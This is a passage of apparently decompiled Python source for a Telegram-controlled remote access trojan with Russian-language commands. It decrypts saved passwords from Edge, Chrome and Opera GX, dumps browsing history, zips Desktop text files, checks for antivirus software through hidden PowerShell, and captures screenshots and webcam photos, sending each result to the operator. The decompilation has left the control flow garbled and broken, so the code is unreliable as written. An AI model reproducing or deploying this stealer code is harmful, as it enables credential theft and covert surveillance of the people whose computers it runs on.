        await message.answer('–û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø–µ –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö –ø–∞—Ä–æ–ª–µ–π')
        await message.answer(f'‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: {str(e)}')

@dp.message(F.text.lower() == '–ø–∞—Ä–æ–ª–∏ edge')
async def edge_passwords(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        def get_edge_path():
            local_path = os.getenv('LOCALAPPDATA')
            edge_path = os.path.join(local_path, 'Microsoft', 'Edge', 'User Data')
            return edge_path if os.path.exists(edge_path) else None

        def get_master_key():
            try:
                edge_path = get_edge_path()
                with open(os.path.join(edge_path, 'Local State'), 'r') as f:
                    pass  # postinserted
            except Exception as e:
                    local_state = json.loads(f.read())
                        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
                        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                    logging.error(f'Edge key error: {e}')
                else:  # inserted
                    pass

        def decrypt_edge_password(encrypted, key):
            try:
                iv, payload = (encrypted[3:15], encrypted[15:(-16)])
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(payload).decode()
            except:
                return 'Decryption failed'

        def extract_edge_credentials():
            master_key = get_master_key()
            if not master_key:
                return 'Key extraction error'
            profiles = [d for d in os.listdir(get_edge_path()) if d.startswith('Profile') or d == 'Default']
            credentials = []
            for profile in profiles:
                try:
                    login_db = os.path.join(get_edge_path(), profile, 'Login Data')
                    with tempfile.NamedTemporaryFile(delete=False) as tmp:
                        pass  # postinserted
                except Exception as e:
                        shutil.copy2(login_db, tmp.name)
                        conn = sqlite3.connect(tmp.name)
                        cursor = conn.cursor()
                        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                        for url, user, passw in cursor.fetchall():
                            decrypted = decrypt_edge_password(passw, master_key)
                            if decrypted:
                                credentials.append(f"URL: {url}\n–õ–æ–≥–∏–Ω: {user}\n–ü–∞—Ä–æ–ª—å: {decrypted}\n{'‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ'}")
                logging.error(f'Profile {profile} error: {e}')
        edge_data = extract_edge_credentials()
        filename = os.path.join(directory, 'edge_data.txt')
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(edge_data)
        try:
            await message.answer_document(document=FSInputFile(filename), caption='üîë –í–æ—Ç –≤–∞—à–∏ –ø–∞—Ä–æ–ª–∏ –∏–∑ Edge')
        except Exception as e:
                os.remove(filename)
    else:  # inserted
        await message.answer('üö´ Access denied')
        await message.answer(f'Error: {str(e)}')
        if os.path.exists(filename):
            os.remove(filename)

@dp.message(F.text.lower() == '–∏—Å—Ç–æ—Ä–∏—è edge')
async def edge_history_handler(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id not in ALLOWED_USER_ID:
        return await message.answer('üö´ –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω')
    else:  # inserted
        await message.answer('‚åõ –ó–∞–≥—Ä—É–∂–∞—é –∏—Å—Ç–æ—Ä–∏—é Edge...')

        def extract_edge_history():
            history_path = os.path.expandvars('%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\History')
            temp_copy = os.path.join(directory, 'edge_history_temp')
            if not os.path.exists(history_path):
                return (False, '‚ùå –§–∞–π–ª –∏—Å—Ç–æ—Ä–∏–∏ Edge –Ω–µ –Ω–∞–π–¥–µ–Ω')
            try:
                shutil.copy2(history_path, temp_copy)
                with sqlite3.connect(temp_copy) as conn:
                    pass  # postinserted
            except Exception as e:
                    cursor = conn.cursor()
                    cursor.execute('\n                    SELECT \n                        url, \n                        title, \n                        last_visit_time \n                    FROM urls \n                    ORDER BY last_visit_time DESC \n                    LIMIT 1000\n                ')
                    history_data = []
                    for url, title, timestamp in cursor.fetchall():
                        win_epoch = datetime.datetime(1601, 1, 1)
                        delta = datetime.timedelta(microseconds=timestamp)
                        visit_time = (win_epoch + delta).strftime('%d.%m.%Y %H:%M:%S')
                        history_data.append(f"üåê {url}\nüìå {(title[:75] + '...' if len(title) > 75 else title)}\nüïí {visit_time}\n{'‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ'}")
                    if not history_data:
                        return
                    else:  # inserted
                        try:
                            if conn:
                                conn.close()
                        except:
                            pass
                    else:  # inserted
                        if os.path.exists(temp_copy):
                            os.remove(temp_copy)
                            return (False, 'üì≠ –ò—Å—Ç–æ—Ä–∏—è –±—Ä–∞—É–∑–µ—Ä–∞ –ø—É—Å—Ç–∞')
                        return (False, 'üì≠ –ò—Å—Ç–æ—Ä–∏—è –±—Ä–∞—É–∑–µ—Ä–∞ –ø—É—Å—Ç–∞')
                    else:  # inserted
                        output_file = os.path.join(directory, 'Edge_History.txt')
                        with open(output_file, 'w', encoding='utf-8') as f:
                            f.write('\n\n'.join(history_data))
                        return (True, output_file)
                    else:  # inserted
                        try:
                            if conn:
                                conn.close()
                        except:
                            pass
                    else:  # inserted
                        if os.path.exists(temp_copy):
                            os.remove(temp_copy)
                    logging.error(f'Edge history error: {str(e)}')
                    return (False, f'‚ö†Ô∏è –û—à–∏–±–∫–∞: {str(e)}')
        status, result = extract_edge_history()
        if status:
            try:
                await message.answer_document(document=FSInputFile(result), caption='üìÇ –ò—Å—Ç–æ—Ä–∏—è Microsoft Edge')
            except Exception as e:
                pass  # postinserted
        else:  # inserted
            await message.answer(result)
            await message.answer(f'‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: {str(e)}')

@dp.message(F.text.lower() == 'txt —Ñ–∞–π–ª—ã —Å —Ä–æ–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞')
async def zip_txt_files(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        src_folder = os.path.join(os.path.expanduser('~'), 'Desktop')
        archive_path = os.path.join(directory, 'txt.zip')
        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as archive:
            for file in os.listdir(src_folder):
                if file.endswith('.txt'):
                    file_path = os.path.join(src_folder, file)
                    archive.write(file_path, os.path.basename(file_path))
        try:
            await message.answer_document(document=FSInputFile(archive_path), caption='üìÇ Txt —Ñ–∞–π–ª—ã')
        except Exception as e:
                os.remove(archive_path)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer(f'‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: {str(e)}')

@dp.message(F.text.lower() == '–ø–∞—Ä–æ–ª–∏ —Ö—Ä–æ–º–∞')
async def cmd_start(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        def get_chrome_path():
            local_path = os.getenv('LOCALAPPDATA')
            chrome_path = os.path.join(local_path, 'Google', 'Chrome', 'User Data')
            if os.path.exists(chrome_path):
                return chrome_path
            return None

        def get_master_key():
            chrome_path = get_chrome_path()
            if not chrome_path:
                return
            try:
                with open(os.path.join(chrome_path, 'Local State'), 'r') as file:
                    pass  # postinserted
            except Exception as e:
                    local_state = file.read()
                    local_state = json.loads(local_state)
                        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                        encrypted_key = encrypted_key[5:]
                        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                        return master_key
                    logging.error(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∫–ª—é—á–∞: {e}')
                    return None

        def decrypt_password(buff, master_key):
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt(payload)[:(-16)].decode()
                return decrypted_pass
            except Exception as e:
                logging.error(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–µ –ø–∞—Ä–æ–ª—è: {e}')
                return None
            else:  # inserted
                pass

        def get_chrome_passwords():
            chrome_path = get_chrome_path()
            if not chrome_path:
                return 'Google Chrome –Ω–µ –Ω–∞–π–¥–µ–Ω.'
            profiles = [profile for profile in os.listdir(chrome_path) if profile.startswith('Profile') or profile == 'Default']
            all_passwords = []
            master_key = get_master_key()
            if not master_key:
                return '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∫–ª—é—á —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è.'
            for profile in profiles:
                try:
                    db_path = os.path.join(chrome_path, profile, 'Login Data')
                    if not os.path.exists(db_path):
                        continue
                    temp_db = tempfile.NamedTemporaryFile(delete=False)
                    shutil.copy2(db_path, temp_db.name)
                    conn = sqlite3.connect(temp_db.name)
                    cursor = conn.cursor()
                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                    login_data = cursor.fetchall()
                    passwords = []
                    for row in login_data:
                        origin_url, username, encrypted_password = row
                        decrypted_password = decrypt_password(encrypted_password, master_key)
                        if decrypted_password:
                            pass  # postinserted
                except Exception as e:
                    else:  # inserted
                        passwords.append(f'–ü—Ä–æ—Ñ–∏–ª—å: {profile}\nURL: {origin_url}\n–õ–æ–≥–∏–Ω: {username}\n–ü–∞—Ä–æ–ª—å: {decrypted_password}\n')
                    conn.close()
                    if passwords:
                        all_passwords.append('\n'.join(passwords))
            else:  # inserted
                return '\n\n'.join(all_passwords) if all_passwords else '–ü–∞—Ä–æ–ª–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.'
                logging.error(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ –∏–∑–≤–ª–µ—á–µ–Ω–∏–∏ –ø–∞—Ä–æ–ª–µ–π –∏–∑ –ø—Ä–æ—Ñ–∏–ª—è {profile}: {e}')
        chrome_passwords = get_chrome_passwords()
        name = 'chrome.txt'
        file_path = os.path.join(directory, name)
        with open(file_path, 'w', encoding='utf-8') as file:
            file.write(chrome_passwords)
        try:
            file_to_send = FSInputFile(file_path)
            await message.answer_document(document=file_to_send, caption='üîë –í–æ—Ç –≤–∞—à–∏ –ø–∞—Ä–æ–ª–∏ –∏–∑ Chrome!')
        except Exception as e:
                if os.path.exists(file_path):
                    os.remove(file_path)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–∞–π–ª–∞: {e}')
        if os.path.exists(file_path):
            os.remove(file_path)

@dp.message(F.text.lower() == '–ø–∞—Ä–æ–ª–∏ –æ–ø–µ—Ä—ã gx')
async def cmd_start(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        def get_opera_gx_path():
            appdata_path = os.getenv('APPDATA')
            opera_gx_path = os.path.join(appdata_path, 'Opera Software', 'Opera GX Stable')
            if os.path.exists(opera_gx_path):
                return opera_gx_path
            return None

        def get_master_key():
            opera_gx_path = get_opera_gx_path()
            if not opera_gx_path:
                return
            try:
                with open(os.path.join(opera_gx_path, 'Local State'), 'r', encoding='utf-8') as file:
                    pass  # postinserted
            except Exception as e:
                    local_state = file.read()
                    local_state = json.loads(local_state)
                        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                        encrypted_key = encrypted_key[5:]
                        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                        return master_key
                    logging.error(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∫–ª—é—á–∞: {e}')

        def decrypt_password(buff, master_key):
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt(payload)[:(-16)].decode()
                return decrypted_pass
            except Exception as e:
                logging.error(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–µ –ø–∞—Ä–æ–ª—è: {e}')
                return None
            else:  # inserted
                pass

        def get_opera_gx_passwords():
            opera_gx_path = get_opera_gx_path()
            if not opera_gx_path:
                return 'Opera GX –Ω–µ –Ω–∞–π–¥–µ–Ω.'
            db_path = os.path.join(opera_gx_path, 'Login Data')
            if not os.path.exists(db_path):
                return '–§–∞–π–ª —Å –ø–∞—Ä–æ–ª—è–º–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω.'
            all_passwords = []
            master_key = get_master_key()
            if not master_key:
                return '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∫–ª—é—á —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è.'
            try:
                temp_db = tempfile.NamedTemporaryFile(delete=False)
                shutil.copy2(db_path, temp_db.name)
                conn = sqlite3.connect(temp_db.name)
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                login_data = cursor.fetchall()
                passwords = []
                for row in login_data:
                    origin_url, username, encrypted_password = row
                    decrypted_password = decrypt_password(encrypted_password, master_key)
                    if decrypted_password:
                        passwords.append(f'URL: {origin_url}\n–õ–æ–≥–∏–Ω: {username}\n–ü–∞—Ä–æ–ª—å: {decrypted_password}\n')
                conn.close()
                if passwords:
                    all_passwords.append('\n'.join(passwords))
            except Exception as e:
                pass  # postinserted
            else:  # inserted
                return '\n\n'.join(all_passwords) if all_passwords else '–ü–∞—Ä–æ–ª–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.'
                logging.error(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ –∏–∑–≤–ª–µ—á–µ–Ω–∏–∏ –ø–∞—Ä–æ–ª–µ–π: {e}')
            else:  # inserted
                pass
        opera_gx_passwords = get_opera_gx_passwords()
        name = 'opera_gx_passwords.txt'
        file_path = os.path.join(directory, name)
        with open(file_path, 'w', encoding='utf-8') as file:
            file.write(opera_gx_passwords)
        try:
            file_to_send = FSInputFile(file_path)
            await message.answer_document(document=file_to_send, caption='üîë –í–æ—Ç –≤–∞—à–∏ –ø–∞—Ä–æ–ª–∏ –∏–∑ Opera GX!')
        except Exception as e:
                if os.path.exists(file_path):
                    os.remove(file_path)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–∞–π–ª–∞: {e}')
        if os.path.exists(file_path):
            os.remove(file_path)

@dp.message(F.text.lower() == '–∏—Å—Ç–æ—Ä–∏—è –æ–ø–µ—Ä—ã gx')
async def cmd_start(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        def get_opera_gx_history():
            history_path = os.path.expandvars('%APPDATA%\\Opera Software\\Opera GX Stable\\History')
            if not os.path.exists(history_path):
                return (False, '–§–∞–π–ª –∏—Å—Ç–æ—Ä–∏–∏ Opera GX –Ω–µ –Ω–∞–π–¥–µ–Ω. –í–æ–∑–º–æ–∂–Ω–æ, –±—Ä–∞—É–∑–µ—Ä Opera GX –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.')
            name = 'temp_opera_gx_history'
            temp_history_path = os.path.join(directory, name)
            shutil.copy2(history_path, temp_history_path)
            conn = sqlite3.connect(temp_history_path)
            cursor = conn.cursor()
            query = '\n            SELECT urls.url, urls.title, urls.last_visit_time\n            FROM urls\n            ORDER BY last_visit_time DESC\n            '
            cursor.execute(query)
            rows = cursor.fetchall()
            text_to_save = ''
            for row in rows:
                url = row[0]
                title = row[1]
                last_visit_time = row[2]
                try:
                    if last_visit_time > 0:
                        last_visit_time = last_visit_time / 1000000 - 11644473600
                        last_visit_time = datetime.datetime.fromtimestamp(last_visit_time).strftime('%Y-%m-%d %H:%M:%S')
                    else:  # inserted
                        last_visit_time = 'Invalid time'
                except (OSError, ValueError) as e:
                    pass  # postinserted
                else:  # inserted
                    text_to_save += f'URL: {url}\nTitle: {title}\nLast Visit: {last_visit_time}\n\n'
            else:  # inserted
                if not text_to_save:
                    os.remove(temp_history_path)
                    return (False, '–ò—Å—Ç–æ—Ä–∏—è Opera GX –ø—É—Å—Ç–∞ –∏–ª–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.')
                file_path = os.path.join(os.getcwd(), '–ò—Å—Ç–æ—Ä–∏—è_OperaGX.txt')
                with open(file_path, 'w', encoding='utf-8') as file:
                    file.write(text_to_save)
                conn.close()
                os.remove(temp_history_path)
                return (True, file_path)
                last_visit_time = f'Error: {str(e)}'
        await message.answer('–ü–æ–ª—É—á–µ–Ω–∏–µ –∏—Å—Ç–æ—Ä–∏–∏ Opera GX. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...')
        success, result = get_opera_gx_history()
        if not success:
            await message.answer(result)
            return
        else:  # inserted
            file_path = result
            try:
                file_to_send = FSInputFile(file_path)
                await message.answer_document(document=file_to_send, caption='üìÇ –ò—Å—Ç–æ—Ä–∏—è –∏–∑ Opera GX')
            except Exception as e:
                pass  # postinserted
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Ñ–∞–π–ª–∞: {e}')

def get_antivirus_programs():
    try:
        result = subprocess.run(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', 'Get-CimInstance -Namespace \"root/SecurityCenter2\" -ClassName AntiVirusProduct | Select-Object -ExpandProperty displayName'], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        antivirus_programs = result.stdout.strip().split('\n')
        return [program.strip() for program in antivirus_programs if program.strip()]
    except subprocess.CalledProcessError as e:
        return []
    else:  # inserted
        pass

@dp.message(F.text.lower() == '–∞–Ω—Ç–∏–≤–∏—Ä—É—Å')
async def cmd_start(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        antivirus_programs = get_antivirus_programs()
        if antivirus_programs:
            await message.answer('*–£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã\\:*\n' + '\n'.join(antivirus_programs), parse_mode='MarkdownV2')
        else:  # inserted
            await message.answer('–ê–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.')
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == '—Å–∫—Ä–∏–Ω—à–æ—Ç')
async def send_photo(message: types.Message):
    if message.date < datetime.datetime.fromtimestamp(START_TIME, datetime.UTC):
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('–°–µ–π—á–∞—Å –±—É–¥–µ—Ç –°–µ—Ä')
        screenshot = ImageGrab.grab()
        filename = 'screenshot.png'
        filepath = os.path.join(directory, filename)
        screenshot.save(filepath)
        photo = FSInputFile(filepath)
        await message.answer_photo(photo)
        if os.path.exists(filepath):
            os.remove(filepath)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == '—Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã')
async def send_photo(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('–°—ã—ã—ã—ã—Ä!')
        filename = 'snapshot.png'
        filepath = os.path.join(directory, filename)
        try:
            reader = imageio.get_reader('<video0>')
            frame = reader.get_next_data()
            if frame is None:
                raise RuntimeError('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∫–∞–¥—Ä —Å –∫–∞–º–µ—Ä—ã.')
            imageio.imwrite(filepath, frame)
            photo = FSInputFile(filepath)
            await message.answer_photo(photo, caption='–í–æ—Ç –≤–∞—à–µ —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã!')
        except RuntimeError as e:
            pass  # postinserted
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer(f'–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ø—ã—Ç–∫–µ —Å–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ: {e}')
    except Exception as e:
        await message.answer('–ö–∞–º–µ—Ä–∞ –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –∏–ª–∏ –∑–∞–Ω—è—Ç–∞ –¥—Ä—É–≥–∏–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º.')

@dp.message(F.text.lower() == '–ø—Ä–æ—Ü–µ—Å—ã')
async def cmd_start(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        process_info_list = []
        for process in psutil.process_iter(['pid', 'name']):
            process_info = f"PID: {process.info['pid']}, {process.info['name']}"
            process_info_list.append(process_info)
        all_processes_info = '\n'.join(process_info_list)
        for i in range(0, len(all_processes_info), MAX_MESSAGE_LENGTH):
            await message.answer(all_processes_info[i:i + MAX_MESSAGE_LENGTH])
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == '–ø–æ–ª–Ω—ã–π –æ—Ç—á–µ—Ç –ø–æ –ø—Ä–æ—Ü–µ—Å–∞–º')
async def cmd_start(message: types.Message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        process_info_list = []
        for process in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info']):
            process_info = f"PID: {process.info['pid']}, Name: {process.info['name']}, User: {process.info['username']}, CPU: {process.info['cpu_percent']}%, Memory: {process.info['memory_info'].rss / 1048576:.2f} MB"
            process_info_list.append(process_info)
        all_processes_info = '\n'.join(process_info_list)
        for i in range(0, len(all_processes_info), MAX_MESSAGE_LENGTH):
            await message.answer(all_processes_info[i:i + MAX_MESSAGE_LENGTH])
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == '–∑–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å')
async def cmd_andprocesses(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('–£–∫–∞–∂–∏—Ç–µ PID –ø—Ä–æ—Ü–µ—Å—Å–∞ –∏–ª–∏ –µ–≥–æ –Ω–∞–∑–≤–∞–Ω–∏–µ.—Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è.')
        await state.set_state(WaitingForInput.waiting_for_pid)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_pid)
async def process_pid(message: types.Message, state: FSMContext):
    if message.from_user.id in ALLOWED_USER_ID:
        user_input = message.text
        if not user_input.isdigit():
            process_name = user_input
            try:
                result = subprocess.run(['taskkill', '/IM', process_name, '/F'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                if result.returncode == 0:
                    await message.answer(f'–ü—Ä–æ—Ü–µ—Å—Å \'{process_name}\' —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à—ë–Ω.')
            except Exception as e:
                else:  # inserted
                    output = result.stdout + result.stderr
                    if 'access is denied' in output.lower():
                        await message.answer(f'–ù–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ \'{process_name}\'.')
                    else:  # inserted
                        if 'not found' in output.lower():
                            await message.answer(f'–ü—Ä–æ—Ü–µ—Å—Å \'{process_name}\' –Ω–µ –Ω–∞–π–¥–µ–Ω.')
                        else:  # inserted
                            await message.answer(f'–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å \'{process_name}\'. –û—à–∏–±–∫–∞:\n{output}')
                            else:  # inserted
                                await state.clear()
        else:  # inserted
            pid = int(user_input)
            try:
                process = psutil.Process(pid)
                process.terminate()
                process.wait(timeout=3)
                await message.answer(f'–ü—Ä–æ—Ü–µ—Å—Å —Å PID {pid} —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω.')
            except psutil.NoSuchProcess:
                pass  # postinserted
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.answer(f'–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {e}')
        await message.answer(f'–ü—Ä–æ—Ü–µ—Å—Å —Å PID {pid} –Ω–µ –Ω–∞–π–¥–µ–Ω.')
    except psutil.AccessDenied:
        await message.answer(f'–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤ –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å PID {pid}.')
    except psutil.TimeoutExpired:
        await message.answer(f'–ü—Ä–æ—Ü–µ—Å—Å —Å PID {pid} –Ω–µ –∑–∞–≤–µ—Ä—à–∏–ª—Å—è –∑–∞ –æ—Ç–≤–µ–¥–µ–Ω–Ω–æ–µ –≤—Ä–µ–º—è. –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ.')
        process.kill()
        await message.answer(f'–ü—Ä–æ—Ü–µ—Å—Å —Å PID {pid} –ø—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω.')

@dp.message(F.text.lower() == '—Å–æ–∑–¥–∞—Ç—å –ø–∞–ø–∫—É')
async def create_folder_command(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('*–£–∫–∞–∂–∏—Ç–µ –ø—É—Ç—å –≥–¥–µ —Å–æ–∑–¥–∞—Ç—å –ø–∞–ø–∫—É –∏ –≤–∫–æ–Ω—Ü–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø–∞–ø–∫–∏\\, –ø—Ä–∏–º–µ—Ä*\\:\n \'C:/Users/Public/–ù–∞–∑–≤–∞–Ω–∏–µ\\_–ø–∞–ø–∫–∏\'', parse_mode='MarkdownV2')
